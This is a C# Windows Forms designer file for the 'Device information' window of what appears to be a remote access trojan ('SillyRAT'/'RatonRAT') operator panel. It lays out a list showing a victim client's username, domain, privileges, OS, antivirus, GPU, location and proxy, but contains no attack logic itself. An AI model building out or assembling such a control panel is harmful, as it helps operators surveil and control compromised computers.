
namespace SillyRAT.ClientForms
{
    partial class FormInformation
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FormInformation));
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.refreshToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.saveJSONToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.listView1 = new System.Windows.Forms.ListView();
            this.meowimcaatatt = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.kdsfsdfds = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.button1 = new System.Windows.Forms.Button();
            this.panel1 = new System.Windows.Forms.Panel();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.label2 = new System.Windows.Forms.Label();
            this.label1 = new System.Windows.Forms.Label();
            this.contextMenuStrip1.SuspendLayout();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // timer1
            // 
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.refreshToolStripMenuItem,
            this.copyToolStripMenuItem,
            this.saveJSONToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(130, 70);
            this.contextMenuStrip1.Opening += new System.ComponentModel.CancelEventHandler(this.contextMenuStrip1_Opening);
            // 
            // refreshToolStripMenuItem
            // 
            this.refreshToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("refreshToolStripMenuItem.Image")));
            this.refreshToolStripMenuItem.Name = "refreshToolStripMenuItem";
            this.refreshToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
            this.refreshToolStripMenuItem.Text = "Refresh";
            this.refreshToolStripMenuItem.Click += new System.EventHandler(this.refreshToolStripMenuItem_Click);
            // 
            // copyToolStripMenuItem
            // 
            this.copyToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("copyToolStripMenuItem.Image")));
            this.copyToolStripMenuItem.Name = "copyToolStripMenuItem";
            this.copyToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
            this.copyToolStripMenuItem.Text = "Copy";
            this.copyToolStripMenuItem.Click += new System.EventHandler(this.copyToolStripMenuItem_Click);
            // 
            // saveJSONToolStripMenuItem
            // 
            this.saveJSONToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("saveJSONToolStripMenuItem.Image")));
            this.saveJSONToolStripMenuItem.Name = "saveJSONToolStripMenuItem";
            this.saveJSONToolStripMenuItem.Size = new System.Drawing.Size(129, 22);
            this.saveJSONToolStripMenuItem.Text = "Save JSON";
            this.saveJSONToolStripMenuItem.Click += new System.EventHandler(this.saveJSONToolStripMenuItem_Click);
            // 
            // listView1
            // 
            this.listView1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(58)))), ((int)(((byte)(57)))), ((int)(((byte)(68)))));
            this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.meowimcaatatt,
            this.kdsfsdfds});
            this.listView1.ContextMenuStrip = this.contextMenuStrip1;
            this.listView1.Font = new System.Drawing.Font("Microsoft JhengHei", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listView1.ForeColor = System.Drawing.SystemColors.Window;
            this.listView1.FullRowSelect = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(24, 59);
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(713, 330);
            this.listView1.SmallImageList = this.imageList1;
            this.listView1.TabIndex = 1;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.SelectedIndexChanged += new System.EventHandler(this.listView1_SelectedIndexChanged);
            // 
            // meowimcaatatt
            // 
            this.meowimcaatatt.Text = " ";
            this.meowimcaatatt.Width = 359;
            // 
            // kdsfsdfds
            // 
            this.kdsfsdfds.Text = " ";
            this.kdsfsdfds.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.kdsfsdfds.Width = 335;
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "ID.png");
            this.imageList1.Images.SetKeyName(1, "username.png");
            this.imageList1.Images.SetKeyName(2, "domain.png");
            this.imageList1.Images.SetKeyName(3, "Priv.png");
            this.imageList1.Images.SetKeyName(4, "Calen.png");
            this.imageList1.Images.SetKeyName(5, "OS.png");
            this.imageList1.Images.SetKeyName(6, "desk.png");
            this.imageList1.Images.SetKeyName(7, "memory.png");
            this.imageList1.Images.SetKeyName(8, "virus.png");
            this.imageList1.Images.SetKeyName(9, "ENGRANAJE.png");
            this.imageList1.Images.SetKeyName(10, "meridian.png");
            this.imageList1.Images.SetKeyName(11, "satel.png");
            this.imageList1.Images.SetKeyName(12, "dsfds.png");
            this.imageList1.Images.SetKeyName(13, "gpu.png");
            this.imageList1.Images.SetKeyName(14, "laptop.png");
            this.imageList1.Images.SetKeyName(15, "world.png");
            this.imageList1.Images.SetKeyName(16, "Proxy.png");
            this.imageList1.Images.SetKeyName(17, "serv.png");
            // 
            // button1
            // 
            this.button1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(27)))), ((int)(((byte)(34)))));
            this.button1.FlatAppearance.BorderSize = 0;
            this.button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.button1.Font = new System.Drawing.Font("Arial Rounded MT Bold", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.button1.ForeColor = System.Drawing.SystemColors.Control;
            this.button1.Location = new System.Drawing.Point(24, 395);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(713, 51);
            this.button1.TabIndex = 5;
            this.button1.Text = "Okay, I\'ve seen too much.";
            this.button1.UseVisualStyleBackColor = false;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // panel1
            // 
            this.panel1.Controls.Add(this.pictureBox1);
            this.panel1.Controls.Add(this.label2);
            this.panel1.Controls.Add(this.label1);
            this.panel1.Location = new System.Drawing.Point(24, 13);
            this.panel1.Name = "panel1";
            this.panel1.Size = new System.Drawing.Size(713, 72);
            this.panel1.TabIndex = 6;
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackgroundImage = global::RatonRAT.Properties.Resources.computerz;
            this.pictureBox1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.pictureBox1.Location = new System.Drawing.Point(4, -1);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(70, 64);
            this.pictureBox1.TabIndex = 10;
            this.pictureBox1.TabStop = false;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Font = new System.Drawing.Font("Arial Rounded MT Bold", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label2.ForeColor = System.Drawing.SystemColors.Control;
            this.label2.Location = new System.Drawing.Point(82, 32);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(377, 22);
            this.label2.TabIndex = 9;
            this.label2.Text = "Get a list of information about the device";
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Arial Rounded MT Bold", 20.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.SystemColors.Control;
            this.label1.Location = new System.Drawing.Point(80, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(261, 32);
            this.label1.TabIndex = 7;
            this.label1.Text = "Device information";
            // 
            // FormInformation
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(40)))), ((int)(((byte)(40)))), ((int)(((byte)(50)))));
            this.ClientSize = new System.Drawing.Size(765, 466);
            this.Controls.Add(this.panel1);
            this.Controls.Add(this.button1);
            this.Controls.Add(this.listView1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MaximizeBox = false;
            this.Name = "FormInformation";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Client information | User ID: ";
            this.TopMost = true;
            this.Load += new System.EventHandler(this.FormInformation_Load);
            this.contextMenuStrip1.ResumeLayout(false);
            this.panel1.ResumeLayout(false);
            this.panel1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        public System.Windows.Forms.Timer timer1;
        private System.Windows.Forms.ContextMenuStrip contextMenuStrip1;
        private System.Windows.Forms.ToolStripMenuItem refreshToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem copyToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem saveJSONToolStripMenuItem;
        public System.Windows.Forms.ListView listView1;
        private System.Windows.Forms.ColumnHeader meowimcaatatt;
        private System.Windows.Forms.ColumnHeader kdsfsdfds;
        private System.Windows.Forms.ImageList imageList1;
        private System.Windows.Forms.Button button1;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label label1;
        public System.Windows.Forms.Label label2;
        private System.Windows.Forms.PictureBox pictureBox1;
    }
}